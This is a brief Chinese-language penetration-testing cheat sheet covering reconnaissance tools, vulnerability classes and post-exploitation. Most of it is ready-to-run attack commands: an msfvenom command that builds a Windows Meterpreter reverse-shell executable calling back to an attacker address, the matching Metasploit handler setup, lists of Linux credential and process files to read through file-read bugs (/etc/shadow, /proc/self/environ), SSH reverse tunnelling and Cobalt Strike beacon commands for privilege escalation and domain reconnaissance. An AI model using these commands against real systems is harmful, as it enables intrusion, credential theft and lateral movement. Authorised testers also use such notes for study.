# 渗透测试

## 资产扫描/信息搜集

- Layer子域名挖掘机

- Nmap

- Goby 

## 渗透

- 敏感信息泄露
 - 源码泄露
 - DEBUG信息泄露
- 逻辑漏洞
- 文件上传


## 后渗透

### Windows 渗透

利用msf套件

反弹shell

生成

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击机地址> LPORT=<攻击机端口> -f exe > shell.exe
```

上传到靶机后

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <靶机地址>
set LPORT <攻击机端口>
exploit
```

拿到meterpreter shell以后

可以``shell``进入cmd环境

信息搜集

```
whoami
hostname
net user
net localgroup administrators
查看是什么操作系统 & 系统版本：
系统中文：systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
系统英文：systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

#### 参考资料
https://guide.offsecnewbie.com/privilege-escalation/windows-pe


### Linux 渗透

#### 敏感文件

```
/etc/passwd
/etc/shadow
```

#### ``/proc``

```
/proc/cpuinfo
/proc/meminfo
/proc/self/maps
/proc/self/cwd
/proc/self/status
/proc/self/exe
/proc/self/environ #查看环境变量
/proc/self/cmdline #查看启动参数
/proc/self/root
```

#### Apache

```
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
```

#### php

```
/etc/php/7.4/fpm/php.ini
/etc/php/7.4/fpm/pool.d/www.conf
```

##### 字典

https://github.com/ev0A/ArbitraryFileReadList


### 提权

```
sudo -l
```

### 隧道

ssh port forwarding

```
ssh -R 9001:localhost:9001 root@192.168.19.130
```

### Cobalt Strike

```
sleep 1 （修改回连时间，快速响应操作）

getuid（查看当前beacon是以什么身份运行的）

getsystem（尝试获取SYSTEM权限）

getprivs（获取当前beacon所有权限）

net view HACKBIJI（非域用户，查看域HACKBIJI计算机信息，可以看到域控服务器地址）

net dclist（域用户，查看域控服务器）

net share（列出所有的共享目录和文件）

net user (列出所有的用户)
```

